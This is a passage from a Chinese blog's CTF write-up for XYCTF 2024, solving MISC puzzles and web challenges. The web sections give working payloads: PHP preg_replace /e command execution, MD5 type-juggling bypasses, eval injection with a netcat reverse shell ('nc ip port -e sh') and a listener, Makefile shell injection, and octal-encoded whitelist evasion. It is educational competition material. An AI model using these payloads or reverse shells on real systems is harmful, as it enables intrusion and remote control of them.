class="string">&quot;abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line">output=<span class="number">2508450541438803643416583335895451914701844680466330955847</span></span><br><span class="line">key=&#123;factorial(<span class="built_in">ord</span>(i)) % <span class="number">233</span>: i <span class="keyword">for</span> i <span class="keyword">in</span> table&#125;</span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">while</span> output:</span><br><span class="line">    flag.append(key[output%(<span class="number">1</span>&lt;&lt;<span class="number">8</span>)])</span><br><span class="line">    output &gt;&gt;= <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag[::-<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> WEB </tag>
            
            <tag> Reverse </tag>
            
            <tag> Crypto </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF 2024</title>
      <link href="/posts/XYCTF2024.html"/>
      <url>/posts/XYCTF2024.html</url>
      
        <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="game"><a href="#game" class="headerlink" title="game"></a>game</h3><blockquote><p>adwa 最近迷恋上了一款游戏，他给我们发了这款游戏里的一个解密项目，请你根据这张图片，找出这个游戏的英文名，并用 XYCTF{}包括 (每个单词开头要大写，例如 XYCTF{Dead Cells})</p></blockquote><p>搜索图片上面的特征图标即可找到</p><p><img src="https://s2.loli.net/2024/05/05/YgK9JfvG81UWy7X.png" alt=""></p><p><strong>XYCTF{Papers,Please}</strong></p><h3 id="熊博士"><a href="#熊博士" class="headerlink" title="熊博士"></a>熊博士</h3><blockquote><p>熊大熊二在森林里玩耍的时候捡到了一张小纸条，可能事关森林的安危，但是上面的字他们看不懂，你能帮他们看看这些神秘的字符是什么意思吗？</p></blockquote><p><img src="https://s2.loli.net/2024/05/05/ELDfTmB5K6MvwH9.png" alt=""></p><p>atbash 解密</p><p><strong>XYCTF{liu_ye_mei_you_xiao_jj}</strong></p><h3 id="zzl-的护理小课堂"><a href="#zzl-的护理小课堂" class="headerlink" title="zzl 的护理小课堂"></a><strong>zzl 的护理小课堂</strong></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;quizForm&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">            event.<span class="title function_">preventDefault</span>(); </span><br><span class="line">    </span><br><span class="line">            <span class="keyword">var</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>(<span class="variable language_">this</span>);</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); </span><br><span class="line">            xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;getScore.php&#x27;</span>, <span class="literal">true</span>); </span><br><span class="line">            xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span> &amp;&amp; xhr.<span class="property">status</span> === <span class="number">200</span>) &#123; </span><br><span class="line">                    <span class="keyword">var</span> score = xhr.<span class="property">responseText</span>;</span><br><span class="line">                    <span class="keyword">if</span> (score == <span class="number">100</span>) &#123;</span><br><span class="line">                        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;scoreDisplay&#x27;</span>).<span class="property">innerText</span> = <span class="string">&quot;你的分数是: &quot;</span> + score + <span class="string">&quot;/100 杂鱼,怎么才100分啊&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &lt; <span class="number">100</span>) &#123;</span><br><span class="line">                        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;scoreDisplay&#x27;</span>).<span class="property">innerText</span> = <span class="string">&quot;你的分数是: &quot;</span> + score + <span class="string">&quot;/100 noooooob!!&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">var</span> flagXhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); </span><br><span class="line">                        flagXhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;flag.php&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">                        flagXhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (flagXhr.<span class="property">readyState</span> === <span class="number">4</span> &amp;&amp; flagXhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> flag = flagXhr.<span class="property">responseText</span>;</span><br><span class="line">                                <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;scoreDisplay&#x27;</span>).<span class="property">innerText</span> = <span class="string">&quot;Flag: &quot;</span> + flag;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;;</span><br><span class="line">                        flagXhr.<span class="title function_">send</span>(); <span class="comment">// 发送请求获取 flag</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            xhr.<span class="title function_">send</span>(formData); <span class="comment">// 发送请求获取分数</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>找到源码，分数得大于 100 分才有 flag，访问/flag.php,并 POST：score=101 得到 flag</p><p><strong>XYCTF{ZZL_TeIL_y0u_462ac0c38028}</strong></p><h3 id="ez-隐写"><a href="#ez-隐写" class="headerlink" title="ez_隐写"></a>ez_隐写</h3><p>附件 zip 伪加密，改 09 为 00 后打开得到 hint.png 和真加密的 zip</p><p>hint.png 经过 puzzlesolve 修复后打开得到提示密码：XYCTF 开赛日期（20240401）</p><p><img src="https://s2.loli.net/2024/05/05/hdKEBQRA9UpySsD.png" alt=""></p><p>解压后得到 WATERMARK.jpg</p><p>盲水印解密后得到 flag</p><p><strong>XYCTF{159-WSX-IJN-852}</strong></p><h3 id="真-gt-签到"><a href="#真-gt-签到" class="headerlink" title="真 &gt; 签到"></a>真 &gt; 签到</h3><p>拿到 zip 不用解压，直接在十六进制数据中得到 flag</p><p><img src="https://s2.loli.net/2024/05/05/rhR3FS4mVZKTusA.png" alt=""></p><p><strong>XYCTF{59bd0e77d13c_1406b23219e_f91cf3a_153e8ea4_77508ba}</strong></p><h3 id="出题有点烦"><a href="#出题有点烦" class="headerlink" title="出题有点烦"></a><strong>出题有点烦</strong></h3><p>开头的加密是弱口令（123456）</p><p>拿到的五张图只有最后一张是有用的，binwalk 分离出一个压缩包，爆破出密码为（xyctf）得到 flag</p><blockquote><p>没活硬整属于是</p></blockquote><p><strong>XYCTF{981e5_f3ca30_c841487_830f84_fb433e}</strong></p><h3 id="我的二维码为啥扫不出来"><a href="#我的二维码为啥扫不出来" class="headerlink" title="我的二维码为啥扫不出来"></a>我的二维码为啥扫不出来</h3><p>得到二维码和加密脚本</p><p>解读脚本可知是把这个 var2(25*25)的二维码随机抽取了某行或某列进行反色，这样的操作进行了七次</p><p>根据二维码定位用的特征符可以手工判断出反色了行 2，列 1,3,6 这里解决了四次，剩下的三次使用脚本爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_color</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> x == <span class="number">255</span> <span class="keyword">else</span> <span class="number">255</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_row_colors</span>(<span class="params">pixels, row, width, block_size=<span class="number">10</span></span>):</span><br><span class="line">    <span class="keyword">for</span> x_block <span class="keyword">in</span> <span class="built_in">range</span>(width // block_size):</span><br><span class="line">        x = x_block * block_size</span><br><span class="line">        y = row * block_size</span><br><span class="line">        <span class="keyword">for</span> x_small <span class="keyword">in</span> <span class="built_in">range</span>(x, x + block_size):</span><br><span class="line">            <span class="keyword">for</span> y_small <span class="keyword">in</span> <span class="built_in">range</span>(y, y + block_size):</span><br><span class="line">                pixel = pixels[x_small, y_small]</span><br><span class="line">                pixels[x_small, y_small] = reverse_color(pixel)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_col_colors</span>(<span class="params">pixels, col, height, block_size=<span class="number">10</span></span>):</span><br><span class="line">    <span class="keyword">for</span> y_block <span class="keyword">in</span> <span class="built_in">range</span>(height // block_size):</span><br><span class="line">        x = col * block_size</span><br><span class="line">        y = y_block * block_size</span><br><span class="line">        <span class="keyword">for</span> x_small <span class="keyword">in</span> <span class="built_in">range</span>(x, x + block_size):</span><br><span class="line">            <span class="keyword">for</span> y_small <span class="keyword">in</span> <span class="built_in">range</span>(y, y + block_size):</span><br><span class="line">                pixel = pixels[x_small, y_small]</span><br><span class="line">                pixels[x_small, y_small] = reverse_color(pixel)</span><br><span class="line"></span><br><span class="line">original_img = Image.<span class="built_in">open</span>(<span class="string">&quot;new.png&quot;</span>)</span><br><span class="line">width, height = original_img.size</span><br><span class="line">pixels = original_img.load()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知需要反色的行和列</span></span><br><span class="line">known_rows_to_reverse = [<span class="number">1</span>]</span><br><span class="line">known_cols_to_reverse = [<span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将已知的行和列进行反色</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> known_rows_to_reverse:</span><br><span class="line">    reverse_row_colors(pixels, row, width)</span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> known_cols_to_reverse:</span><br><span class="line">    reverse_col_colors(pixels, col, height)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 枚举所有可能的组合，将结果保存为不同的PNG文件</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>, <span class="number">17</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>, <span class="number">17</span>):</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> known_rows_to_reverse <span class="keyword">and</span> j <span class="keyword">not</span> <span class="keyword">in</span> known_cols_to_reverse:</span><br><span class="line">            temp_img = original_img.copy()</span><br><span class="line">            reverse_row_colors(temp_img.load(), i, width)</span><br><span class="line">            reverse_col_colors(temp_img.load(), j, height)</span><br><span class="line">            temp_img.save(<span class="string">f&quot;result_row_<span class="subst">&#123;i&#125;</span>_col_<span class="subst">&#123;j&#125;</span>.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到大量的二维码，工具批量扫描得到 flag</p><p><img src="https://s2.loli.net/2024/05/05/W8sTpqe3EhyrVKZ.png" alt=""></p><p><strong>flag{qR_c0d3_1s_s0_fun}</strong></p><p>补：从第一 wp 学到知识</p><p><img src="https://s2.loli.net/2024/05/05/RAaTjKO3ZSvcMUr.png" alt=""></p><h3 id="EZ-Base1024-2"><a href="#EZ-Base1024-2" class="headerlink" title="EZ_Base1024*2"></a><strong>EZ_Base1024*2</strong></h3><p><a href="https://nerdmosis.com/tools/encode-and-decode-base2048">Encode and Decode Base2048 Online Tool</a></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a><strong>warm up</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;next.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$XYCTF</span> = <span class="string">&quot;Warm up&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$md5</span>) &amp;&amp; <span class="variable">$md5</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ezez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$XY</span> == <span class="variable">$XYCTF</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$XY</span> != <span class="string">&quot;XYCTF_550102591&quot;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$XY</span>) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;XYCTF_550102591&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;什么情况,这么基础的md5做不来&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;学这么久,传参不会传?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload1：</p><p><code>?val1=MMHUWUV&amp;val2=MAUXXQC&amp;md5=0e215962017&amp;XY=0e1284838308&amp;XYCTF=0e1284838308</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;操作你O.o&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);  <span class="comment">// 我可不会像别人一样设置10来个level</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;有点汗流浃背&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload2：</p><p><code>/LLeeevvveeelll222.php?a=/xxx/e&amp;b=system(&#39;tac /flag&#39;);&amp;c=xxx</code></p><p><code>POST：a[]=</code></p><h3 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a><strong>ezhttp</strong></h3><p>开始是登录界面在源码注释处找到 hint</p><blockquote><p>为了防止忘记密码，我把它们放在某个地方了</p></blockquote><p>访问/robots.txt,被引路到/l0g1n.txt 得到账号密码</p><p><code>username: XYCTF</code></p><p><code>password: @JOILha!wuigqi123$</code></p><p>登录后按提示伪造 http 头</p><p>via:ymzx.qq.com</p><p>Client-IP:127.0.0.1</p><p>cookie:XYCTF</p><p>Referer:yuanshen.com</p><p>User-Agent:XYCTF</p><p>得到 flag</p><h3 id="ezmd5"><a href="#ezmd5" class="headerlink" title="ezmd5"></a>ezmd5</h3><p><a href="https://zhangshuqiao.org/2018-02/%E5%88%B6%E9%80%A0MD5%E7%A2%B0%E6%92%9E/">制造 MD5 碰撞</a></p><p>上传两张 md5 值相同的 jpg 图片得到 flag</p><h3 id="牢牢记住，逝者为大"><a href="#牢牢记住，逝者为大" class="headerlink" title="牢牢记住，逝者为大"></a>牢牢记住，逝者为大</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Kobe</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) &gt; <span class="number">13</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;see you again~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;肘死你&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$val_name</span> =&gt; <span class="variable">$val_val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;</span>, <span class="variable">$val_val</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;what can i say&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">Kobe</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span>  . <span class="string">&quot;,manba out&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;,mamba out&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#man,,manba out</span></span><br></pre></td></tr></table></figure><p>重点在最下面的eval，前面和后面都有内容来影响命令执行<br>前面用换行%0a来截断，后面用;+#来注释掉，<br>实际测试时发现要进行url编码否则绕不过，构造payload：<br><strong>cmd=%0a`$_GET[1]`;%23&amp;1=c\’\’p /[\@-z][\@-z][@-z]g . （把flag复制到当前目录来，然后访问直接下载flag）</strong><br><strong>cmd=%0a`$_GET[1]`;%23&amp;1=nc ip port -e sh; (反弹shell)</strong></p><h3 id="ezMake"><a href="#ezMake" class="headerlink" title="ezMake"></a>ezMake</h3><p><a href="https://www.cnblogs.com/phillee/p/15020046.html">Makefile 学习笔记之 shell 命令调用及目录处理 - coffee_tea_or_me - 博客园</a></p><p>command：$(shell cat flag)</p><h3 id="ez-Make"><a href="#ez-Make" class="headerlink" title="ez?Make"></a>ez?Make</h3><p>同上多了过滤，目录穿越</p><p>cd ..&amp;&amp;cd ..&amp;&amp;cd ..&amp;&amp;more <sup><a href="#fn_e" id="reffn_e">e</a></sup><sup><a href="#fn_e" id="reffn_e">e</a></sup><sup><a href="#fn_e" id="reffn_e">e</a></sup><sup><a href="#fn_e" id="reffn_e">e</a></sup></p><p><sup><a href="#fn_e" id="reffn_e">e</a></sup>表示除了 e 以外的其他的字符</p><p>反弹 shell 也可以</p><p><code>nc ip port -e sh</code></p><p>vps 开监听端口即可</p><p><code>nc -lvnp port</code></p><p><img src="https://s2.loli.net/2024/05/05/FXutQMcLWCV1mHz.png" alt=""></p><h3 id="εZ-¿м-Kε¿"><a href="#εZ-¿м-Kε¿" class="headerlink" title="εZ?¿м@Kε¿?"></a><strong>εZ?¿м@Kε¿?</strong></h3><blockquote><p>参考第一名的 wp</p></blockquote><p><a href="https://blog.csdn.net/dlf1769/article/details/78997967">Makefile 中的$@, $^, $&lt; , $?, $%, $+, $*-CSDN 博客</a></p><p>在 Makefile 中，大家经常会见到类似$@、$^、$&lt; 这种类型的变量。</p><p>这种变量一般称为自动变量，自动变量是局部变量，作用域范围在当前的规则内，它们分别代表不同的含义：</p><p>$@：目标</p><p>$^：所有目标依赖</p><p>$&lt;：目标依赖列表中的第一个依赖</p><p>$?：所有目标依赖中被修改过的文件</p><p>这里第一个依赖是就是 /flag</p><p>利用 shell 变量替换符 $(&lt;file)读文件</p><p><code>$$(&lt;$&lt;)</code> 读出/flag</p><p><u>这里两个 $$ 才代表一个 $ </u></p><h3 id="ezRCE"><a href="#ezRCE" class="headerlink" title="ezRCE"></a><strong>ezRCE</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>构造八进制脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">convert_to_octal</span>(<span class="keyword">string</span>):</span><br><span class="line">    octal_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char in <span class="keyword">string</span>:</span><br><span class="line">        octal_char = <span class="title function_ invoke__">oct</span>(<span class="title function_ invoke__">ord</span>(char))[<span class="number">2</span>:]</span><br><span class="line">        <span class="comment"># 如果八进制不够三位，则在前面补零</span></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">len</span>(octal_char) &lt; <span class="number">3</span>:</span><br><span class="line">            octal_char = <span class="string">&quot;0&quot;</span> * (<span class="number">3</span> - <span class="title function_ invoke__">len</span>(octal_char)) + octal_char</span><br><span class="line">        octal_string += <span class="string">&quot;\\&quot;</span> + octal_char</span><br><span class="line">    <span class="keyword">return</span>  octal_string </span><br><span class="line"></span><br><span class="line">user_input = <span class="title function_ invoke__">input</span>(<span class="string">&quot;请输入字符串：&quot;</span>)</span><br><span class="line">result = <span class="title function_ invoke__">convert_to_octal</span>(user_input)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;转换后的结果为:&quot;</span>, result)</span><br></pre></td></tr></table></figure><p>payload：</p><p><code>Ls   -&gt;   $&#39;\154\163&#39;</code></p><p>测试中发现传空格就不行，并且白名单中还剩 